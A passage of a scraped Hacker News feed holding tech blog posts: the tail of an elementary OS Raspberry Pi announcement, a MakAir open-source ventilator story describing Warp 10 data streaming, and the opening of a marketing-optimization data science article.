<p>That said, the audience for Raspberry Pi leans toward tinkerers and experimenters; as such, we’ve decided to publish our builds under our <a rel="nofollow noopener noreferrer" target="_blank" href="https://builds.elementary.io/">Early Access builds</a> program. This means dedicated <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/sponsors/elementary">sponsors</a> of elementary OS who wish to run elementary OS on Raspberry Pi can download it from the same place as Early Access builds of elementary OS. As a note, all of this work has been focused on bringing the <strong>pre-release of elementary OS 6</strong> to Raspberry Pi, so all the usual disclaimers about pre-release builds apply here as well.</p>



<p>Once you have access to Early Access builds, head over to the <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/elementary/os/wiki/Raspberry-Pi">elementary OS wiki</a> to get it installed on your own hardware. If you find and file any issues, please remember to specify the build of the OS you downloaded as well as that you are running on Raspberry Pi—it will help us validate and triage issues much more quickly.</p>

<h2 id="thanks-to-andrew-david-hewitt-and-marius-meisenzahl">Thanks to Andrew, David Hewitt, and Marius Meisenzahl</h2>

<p>Bringing elementary OS to Raspberry Pi was a collaborative effort. <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/andrewc910">Andrew</a>, <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/davidmhewitt">David Hewitt</a>, and <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/meisenzahl">Marius Meisenzahl</a> specifically worked to prototype, improve, and ultimately ship these builds. And of course countless folks across the Raspberry Pi Foundation, Debian, Canonical, Ubuntu, and more have worked for years on making the underlying system work well for us to build on.</p>


  </section>

  <div>
  <hr>

  
    <h2>Thank You</h2>
    <p>Thanks to all of our supporters, backers, and customers! Your contributions make elementary possible. If you’d like to help build and improve elementary OS, don’t hesitate to <a rel="nofollow noopener noreferrer" target="_blank" href="https://elementary.io/get-involved" onclick="plausible('Link: Get Involved')">Get Involved</a>.</p>
  

  
</div>



</article></div>]]>
            </description>
            <link>https://blog.elementary.io/elementary-os-on-raspberry-pi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25670591</guid>
            <pubDate>Thu, 07 Jan 2021 13:12:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[MakAir: Covid-19 ventilator with a Raspberry Pi]]>
            </title>
            <description>
<![CDATA[
Score 95 | Comments 63 (<a href="https://news.ycombinator.com/item?id=25670303">thread link</a>) | @mtmail
<br/>
January 7, 2021 | https://blog.senx.io/makair-covid-19-ventilator-with-a-raspberry-pi/ | <a href="https://web.archive.org/web/*/https://blog.senx.io/makair-covid-19-ventilator-with-a-raspberry-pi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>During the COVID-19 crisis, The birth of the first open source data enabled ventilator. </p><article>
      
<p>Back to March 20, 2020. <a href="https://twitter.com/waxzce" target="_blank" rel="noreferrer noopener">Quentin Adam</a>, with some friends living in Nantes, is trying to build a ventilator prototype with 3D printing and Arduino, in response to a shortage of equipment. </p>



<p><strong>Project MakAir is started</strong>. </p>



<p>Quentin, a software expert and CEO of <a href="https://www.clever-cloud.com/" target="_blank" rel="noreferrer noopener">Clever Cloud</a>, is struggling with the electronics part and looking for electronics engineers. Among his friends is Mathias, SenX CTO. That is how Mathias asked me to review the electronics part of the project. My first call with Quentin was to help him connect an old pressure sensor to an Arduino, during the late evening of March 20.</p>



<p><strong>The goal was clear: to mass-produce an open-source medical ventilator</strong>. Crazy! Looking at the project that day, it looked like an "amateur" project. So I did the first real schematics, the first BOM, the first Radiospares, and Farnell reference list during the weekend, discussing with more and more people on the MakAir Slack. </p>



<figure></figure>



<h3>Amateur? Not really...</h3>



<p>Next Thursday, I understood that the small "amateur" project is quickly getting big. Two electronics companies detached people, and a whole regulatory team was up. In this team, there were some experts in medical devices. We also knew that we were on a shortlist of projects that the French government is looking at closely.</p>



<p>I soon realized that in Nantes, there is no one able to actually make the prototypes. <a href="https://blog.senx.io/connecting-a-beertender-to-warp-10-using-mqtt-on-lorawan-with-thethingsnetwork/" target="_blank" rel="noreferrer noopener">Engineers with prototyping knowledge</a> are scarce, I just know a few of them like me. So, on the 25th during the evening, in a few minutes, I convinced Cherine, a former Renault Sport colleague living near Paris who has the same knowledge of prototyping as me, to join the project as well.</p>



<p><strong>On the 26th, I joined the MakAir core team, choosing to confine myself with 17 other people to make project MakAir a reality</strong>. Cherine came from Paris the same day I came from Brest. At the same time in France, 100 people were already helping us remotely. </p>



<p>I brought with me all my personal tools, from soldering iron to oscilloscope, and tons of components. </p>



<figure><blockquote><p>If I had been told this would last 25 days, I would have brought more than 3 days of clothing!</p></blockquote></figure>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328-1024x682.jpg" data-src="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328-1024x682.jpg" alt="working in the Palace, Nantes" width="509" height="339" data-srcset="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328-1024x682.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328-300x200.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328-768x512.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328-1536x1024.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328-600x400.jpg 600w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328.jpg 2000w" data-sizes="(max-width: 509px) 100vw, 509px" srcset="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328-1024x682.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328-300x200.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328-768x512.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328-1536x1024.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328-600x400.jpg 600w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328.jpg 2000w"><figcaption>One sleepless night later, the first functional prototype was up.</figcaption></figure></div>







<p>Three days later, <strong>the <a href="http://www.cea.fr/" target="_blank" rel="noreferrer noopener">CEA</a></strong> (french government agency for atomic energy) is now supporting us. On the 31<sup>st</sup> of March, we all moved from Nantes to Grenoble CEA facility, traveling on a nearly empty motorway.</p>



<p>The first prototype had basic electronics: STM32 Nucleo, a small 4 lines screen, a few buttons, a good precision pressure sensor, and several servo outputs. <strong>This first prototype allows us to make a pig breath for 4 hours</strong> on the 3rd of April, only 2 weeks after the project started.</p>



<figure><ul><li><figure><img loading="lazy" width="1024" height="682" src="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336-1024x682.jpg" data-src="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336-1024x682.jpg" alt="" data-id="11640" data-link="https://blog.senx.io/?attachment_id=11640" data-srcset="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336-1024x682.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336-300x200.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336-768x512.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336-1536x1024.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336-600x400.jpg 600w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336.jpg 2000w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336-1024x682.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336-300x200.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336-768x512.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336-1536x1024.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336-600x400.jpg 600w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336.jpg 2000w"><figcaption>The first prototype board...</figcaption></figure></li><li><figure><img loading="lazy" width="1024" height="682" src="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337-1024x682.jpg" data-src="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337-1024x682.jpg" alt="" data-id="11641" data-link="https://blog.senx.io/?attachment_id=11641" data-srcset="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337-1024x682.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337-300x200.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337-768x512.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337-1536x1024.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337-600x400.jpg 600w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337.jpg 2000w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337-1024x682.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337-300x200.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337-768x512.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337-1536x1024.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337-600x400.jpg 600w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337.jpg 2000w"><figcaption>Stacking a Nucleo F411 with pressure sensor, keyboard, screen.</figcaption></figure></li><li><figure><img loading="lazy" width="1024" height="768" src="https://blog.senx.io/wp-content/uploads/2020/09/4C103809-C6CC-423D-B054-48B8C853F29E_1_105_c.jpeg" data-src="https://blog.senx.io/wp-content/uploads/2020/09/4C103809-C6CC-423D-B054-48B8C853F29E_1_105_c.jpeg" alt="" data-id="11748" data-full-url="https://blog.senx.io/wp-content/uploads/2020/09/4C103809-C6CC-423D-B054-48B8C853F29E_1_105_c.jpeg" data-link="https://blog.senx.io/?attachment_id=11748" data-srcset="https://blog.senx.io/wp-content/uploads/2020/09/4C103809-C6CC-423D-B054-48B8C853F29E_1_105_c.jpeg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/4C103809-C6CC-423D-B054-48B8C853F29E_1_105_c-300x225.jpeg 300w, https://blog.senx.io/wp-content/uploads/2020/09/4C103809-C6CC-423D-B054-48B8C853F29E_1_105_c-768x576.jpeg 768w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://blog.senx.io/wp-content/uploads/2020/09/4C103809-C6CC-423D-B054-48B8C853F29E_1_105_c.jpeg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/4C103809-C6CC-423D-B054-48B8C853F29E_1_105_c-300x225.jpeg 300w, https://blog.senx.io/wp-content/uploads/2020/09/4C103809-C6CC-423D-B054-48B8C853F29E_1_105_c-768x576.jpeg 768w"><figcaption>First wood prototype</figcaption></figure></li></ul></figure>



<h2>Enters the Raspberry Pi</h2>



<p>What we learned from the first test on a pig:</p>



<ul><li>The ventilator did the job. The pig was alive and woke up correctly.</li><li><strong>There is a huge UX problem.</strong></li><li>The airflow measurement is really helpful.</li></ul>



<p>The experts from the medical world are now used to high-tech screens displaying curves with not only pressure, but real-time air volume blown into the patient lungs. Even in crisis time, we understand that our product does not meet their minimum UI/UX needs.</p>



<figure><img loading="lazy" width="1024" height="418" src="https://blog.senx.io/wp-content/uploads/2020/09/image-4-1024x418.jpg" data-src="https://blog.senx.io/wp-content/uploads/2020/09/image-4-1024x418.jpg" alt="difference of UX between first MakAir screen and a recent ventilator" data-srcset="https://blog.senx.io/wp-content/uploads/2020/09/image-4-1024x418.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/image-4-300x123.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/image-4-768x314.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/image-4-1536x627.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/image-4.jpg 1660w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://blog.senx.io/wp-content/uploads/2020/09/image-4-1024x418.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/image-4-300x123.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/image-4-768x314.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/image-4-1536x627.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/image-4.jpg 1660w"><figcaption>Makair prototype on the left, a recent ventilator on the right. <br>Both can save life, but UX gap is huge!</figcaption></figure>



<p>Always listen to the users. Even if we succeed in mass production of an open-source ventilator, if doctors want curves and measures of the number of air liters entering the lungs, we must do it. </p>



<p>Since the beginning, this project is time driven. We never consider the price, but we always look at worldwide stocks. In a time where lots of plants are closed in Europe, <strong>the supply chain is leading the project.</strong></p>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6374-edited.jpg" data-src="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6374-edited.jpg" alt="inside the v1 of the MakAir" width="522" height="347" data-srcset="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6374-edited.jpg 1378w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6374-edited-300x200.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6374-edited-1024x683.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6374-edited-768x512.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6374-edited-600x400.jpg 600w" data-sizes="(max-width: 522px) 100vw, 522px" srcset="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6374-edited.jpg 1378w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6374-edited-300x200.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6374-edited-1024x683.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6374-edited-768x512.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6374-edited-600x400.jpg 600w"><figcaption>Scooter lead-acid batteries. Because these are the most available batteries in the word.</figcaption></figure></div>



<p>So, what is the world's most available touch screen? </p>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/09/image-2.png" data-src="https://blog.senx.io/wp-content/uploads/2020/09/image-2.png" alt="farnell stocks" width="616" height="217" data-srcset="https://blog.senx.io/wp-content/uploads/2020/09/image-2.png 832w, https://blog.senx.io/wp-content/uploads/2020/09/image-2-300x106.png 300w, https://blog.senx.io/wp-content/uploads/2020/09/image-2-768x270.png 768w" data-sizes="(max-width: 616px) 100vw, 616px" srcset="https://blog.senx.io/wp-content/uploads/2020/09/image-2.png 832w, https://blog.senx.io/wp-content/uploads/2020/09/image-2-300x106.png 300w, https://blog.senx.io/wp-content/uploads/2020/09/image-2-768x270.png 768w"><figcaption>(and 18000 more at radiospares)</figcaption></figure></div>



<p>As I just said, the supply chain rules the project. MakAir will have a raspberry to display curves. Nice coincidence for an open-source project!</p>



<p>By the way, the mass flow meter sensor was a huge problem. Since the beginning, MakAir did not want to disturb the production of existing ventilators. But this component is on the airway, it should be approved for medical use. In April, it was impossible to source any Sensirion or Honeywell mass flow sensors... Anyway, the next test will be done with a raspberry connected to the STM32. </p>







<h2>Enter Warp&nbsp;10</h2>



<p>On the 17th of April, the first batch of ventilators built in the CEA clean-rooms was ready. This batch was used for the 1st clinical tests. </p>



<p><strong>The pressure switches from the technical team to the regulatory team, remotely working on the project since the beginning. </strong></p>



<p>To prepare the next batch, we came back to Nantes. After 25 days, we switched from commando mode (18h/day, 7 days a week) to a more standard week (14h/day, the weekends with the family).</p>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/09/IMG_5752-1024x768.jpg" data-src="https://blog.senx.io/wp-content/uploads/2020/09/IMG_5752-1024x768.jpg" alt="MakAir team in the CEA cleanroom with prototypes" width="521" height="390" data-srcset="https://blog.senx.io/wp-content/uploads/2020/09/IMG_5752-1024x768.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_5752-300x225.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_5752-768x576.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_5752-1536x1152.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_5752.jpg 2016w" data-sizes="(max-width: 521px) 100vw, 521px" srcset="https://blog.senx.io/wp-content/uploads/2020/09/IMG_5752-1024x768.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_5752-300x225.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_5752-768x576.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_5752-1536x1152.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_5752.jpg 2016w"><figcaption>Tyvek sterile clothing in a cleanroom. Could not be better for medical device assembly. Thanks to the CEA.</figcaption></figure></div>



<p>On the 30<sup>th</sup> of April, the prototype with a Raspberry Pi is ready for the next animal test. Two people had to fly to Grenoble CEA with this prototype, but the rest of us, and all the people remotely working on the project wanted to follow the experience. </p>



<p>So, the night before the test, I quickly deployed Warp&nbsp;10 on the raspberry and wrote a small script to copy data every 10s to another Warp&nbsp;10 server.</p>


<span><span><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fblog.senx.io%2F%3Fp%3D11630&amp;text=MakAir%3A%20the%20birth%20of%20the%20first%20open-source%20data-enabled%20ventilator.%20From%20the%20first%20prototype%20to%20more%20modern%20UX%2C%20thanks%20to%20Raspberry%20Pi.&amp;via=SenXHQ&amp;related=SenXHQ" target="_blank" rel="noopener noreferrer">MakAir: the birth of the first open-source data-enabled ventilator. From the first prototype to more modern UX, thanks to Raspberry Pi. </a></span><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fblog.senx.io%2F%3Fp%3D11630&amp;text=MakAir%3A%20the%20birth%20of%20the%20first%20open-source%20data-enabled%20ventilator.%20From%20the%20first%20prototype%20to%20more%20modern%20UX%2C%20thanks%20to%20Raspberry%20Pi.&amp;via=SenXHQ&amp;related=SenXHQ" target="_blank" rel="noopener noreferrer">Click To Tweet</a></span>


<p>What is <a href="https://www.warp10.io/" target="_blank" rel="noreferrer noopener">Warp&nbsp;10</a>? It is a time series platform. But unlike other TSDB (Time Series Database), there is a full analysis environment behind, and even a task scheduler. Compress time series, replicate to another server while managing network outage is really easy. Same tooling on the server and the connected object, that what I call easy IoT. To stream data, you just need a few WarpScript functions among <a href="https://www.warp10.io/doc/functionList" target="_blank" rel="noreferrer noopener">the thousand available</a>.</p>



<p>Basically, the WarpScript pseudo code is:</p>



<pre><code>- Read the last value of makair.lastupload GTS
- take the last tick as start
- take now as end
- fetch locally all the makair GTS from start to end
- WRAP all the GTS
- build a script that UNWRAP and UPDATE the data
- do a remote execution of the script with REXEC 
- if the REXEC was a success, store end in makair.lastupload</code></pre>



<p>You can follow the <a href="https://www.warp10.io/content/04_Tutorials/01_WarpScript/30_Server_to_Server" target="_blank" rel="noreferrer noopener">server to server tutorial</a> to implement such a WarpScript, then save it as $WARP10HOME/warpscripts/makair/10000/upload_data.mc2 to schedule an execution every 10s.</p>



<p>To display data in real-time, <a href="http://studio.senx.io/" target="_blank" rel="noreferrer noopener">WarpStudio</a> did the job easily too. Autorefresh of the DataViz every 10s is a built-in function:</p>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/09/image-3.png" data-src="https://blog.senx.io/wp-content/uploads/2020/09/image-3.png" alt="autorefresh settings of the MakAir test" width="522" height="385" data-srcset="https://blog.senx.io/wp-content/uploads/2020/09/image-3.png 575w, https://blog.senx.io/wp-content/uploads/2020/09/image-3-300x221.png 300w" data-sizes="(max-width: 522px) 100vw, 522px" srcset="https://blog.senx.io/wp-content/uploads/2020/09/image-3.png 575w, https://blog.senx.io/wp-content/uploads/2020/09/image-3-300x221.png 300w"><figcaption>In the dataviz tab of WarpStudio.</figcaption></figure></div>







<p>Around 30 lines of code to allow all the MakAir team to follow the pressure inside the pig lungs in real-time!</p>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-1024x683.jpg" data-src="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-1024x683.jpg" alt="real time display" width="516" height="343" data-srcset="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-1024x683.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-300x200.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-768x512.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-1536x1024.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-2048x1365.jpg 2048w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-600x400.jpg 600w" data-sizes="(max-width: 516px) 100vw, 516px" srcset="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-1024x683.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-300x200.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-768x512.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-1536x1024.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-2048x1365.jpg 2048w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-600x400.jpg 600w"><figcaption>WarpStudio on a 60" 4k display, that's a nice dashboard.</figcaption></figure></div>







<h2>Next steps</h2>



<p>MakAir ventilators are designed to store everything in the <a href="https://warp10.io/" target="_blank" rel="noreferrer noopener">Warp&nbsp;10</a> time series database. They also have built-in WiFi and LoRa. All these features are not yet available, because the priority is still to make an open-source approved ventilator. </p>



<figure><ul><li><figure><img loading="lazy" width="225" height="300" src="https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-scaled.jpg" data-src="https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-225x300.jpg" alt="" data-id="11728" data-full-url="https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-scaled.jpg" data-link="https://blog.senx.io/?attachment_id=11728" data-srcset="https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-225x300.jpg 225w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-768x1024.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-1152x1536.jpg 1152w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-1536x2048.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-scaled.jpg 1920w" data-sizes="(max-width: 225px) 100vw, 225px" srcset="https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-225x300.jpg 225w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-768x1024.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-1152x1536.jpg 1152w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-1536x2048.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-scaled.jpg 1920w"><figcaption>Revision 3 has a Raspberry screen on top of the small screen.</figcaption></figure></li><li><figure><img loading="lazy" width="225" height="300" src="https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-scaled.jpg" data-src="https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-225x300.jpg" alt="" data-id="11727" data-full-url="https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-scaled.jpg" data-link="https://blog.senx.io/?attachment_id=11727" data-srcset="https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-225x300.jpg 225w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-768x1024.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-1152x1536.jpg 1152w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-1536x2048.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-scaled.jpg 1920w" data-sizes="(max-width: 225px) 100vw, 225px" srcset="https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-225x300.jpg 225w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-768x1024.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-1152x1536.jpg 1152w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-1536x2048.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-scaled.jpg 1920w"><figcaption>The Raspberry Pi connected to the mainboard</figcaption></figure></li></ul></figure>



<p>Connected features + open-source software is an enabler for doctors and researchers to perform extensive data collection and try new algorithms in the machine. Warp&nbsp;10 is the best open source time series database to <a href="https://blog.senx.io/warp-10-for-iot-gdpr-compliant-before-gdpr-even-existed/" target="_blank" rel="noreferrer noopener">securely</a> store medical data and analyze it. It's not a walled garden.</p>



<p>If you need to connect medical devices to a time series database, <a href="mailto:contact@senx.io" target="_blank" rel="noreferrer noopener">just ask us</a>.</p>



<p>MakAir is now entering the second phase of clinical tests. We can consider we are halfway to the goal. Keep in mind that among all the projects of ventilators announced by big companies, MakAir is the only one to reach the clinical tests step. <a href="https://makair.life/" target="_blank" rel="noreferrer noopener">200 people, backed up by CEA and a few french companies</a> are about to make a commercially available open source ventilator... </p>



<p>That's crazy when you think about it!</p>



<p>Learn more about the MakAir project on <a href="http://makair.life/" target="_blank" rel="noreferrer noopener">makair.life</a>.</p>
<!-- relpost-thumb-wrapper --><!-- close relpost-thumb-wrapper -->      
           
    </article></div>]]>
            </description>
            <link>https://blog.senx.io/makair-covid-19-ventilator-with-a-raspberry-pi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25670303</guid>
            <pubDate>Thu, 07 Jan 2021 12:34:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Science in Marketing Optimization – Lessons from Airbnb, Lyft, DoorDash]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25670229">thread link</a>) | @eric_cartman
<br/>
January 7, 2021 | https://blogboard.io/blog/data-science-in-marketing-optimization/ | <a href="https://web.archive.org/web/*/https://blogboard.io/blog/data-science-in-marketing-optimization/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1563705883268-eb58ab6f505d?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE1fHx0YXJnZXR8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 300w,
                            https://images.unsplash.com/photo-1563705883268-eb58ab6f505d?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE1fHx0YXJnZXR8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 600w,
                            https://images.unsplash.com/photo-1563705883268-eb58ab6f505d?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE1fHx0YXJnZXR8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 1000w,
                            https://images.unsplash.com/photo-1563705883268-eb58ab6f505d?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE1fHx0YXJnZXR8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1563705883268-eb58ab6f505d?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE1fHx0YXJnZXR8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="Data Science for Marketing Optimization - Case Studies from Airbnb, Lyft, DoorDash">
            </figure>

            <section>
                <div>
                    <p>In this article we'll look at several case studies of data science being used to optimize marketing efforts at companies like Lyft, Airbnb, Netflix, Doordash, Wolt, Rovio Entertainment.</p><p>In large and analytically mature organizations, the <em>optimization</em> piece usually comes as a part of a larger <em>marketing automation</em> system, but as we'll see it's not always the case. Doing budget allocation to channels and campaign manually, but with the aid of data science tool set can be hugely profitable and might be a good first step towards a fully automated workflow.</p><p>Before diving into details, let's look at high level architecture of an automated process for online marketing. As a result of streamlining the process that's largely determined by the way online advertising platforms work, marketing automation platforms look very much alike across different companies. In general, these platforms are large systems that comprise the following:</p><ol><li>Data tracking system <br>Track conversion events (customer signups, payment events, subscriptions, micro-transactions, etc).</li><li>Attribution system<br>Connect conversion events with the user acquisition source. That is, for each user we want to know exactly the marketing channel and the campaign that brought them in.</li><li>Performance estimation system<br>Let's say a campaign brought in 1000 users. We want to know if it paid off. We know how much we spent on it, but how do we know how much revenue the users will bring us over their lifetime. LTV and conversion modelling comes into play here.</li><li>Campaign management system<br>Online ads are a very fertile field for variation testing and content generation. But even without testing multiple you variations of the same ad, companies typically target different segments in different ways, easily resulting in dozens or hundreds ads running simultaneously. Companies like Airbnb and Netflix invest heavily in systems that support ad creation and management (<a href="https://medium.com/airbnb-engineering/growing-our-host-community-with-online-marketing-9b2302299324">Airbnb article</a>, <a href="https://netflixtechblog.com/https-medium-com-netflixtechblog-engineering-to-improve-marketing-effectiveness-part-2-7dd933974f5e">Netflix article</a>).</li><li>Automated bidding and budget optimization<br>The largest ad serving platforms provide you 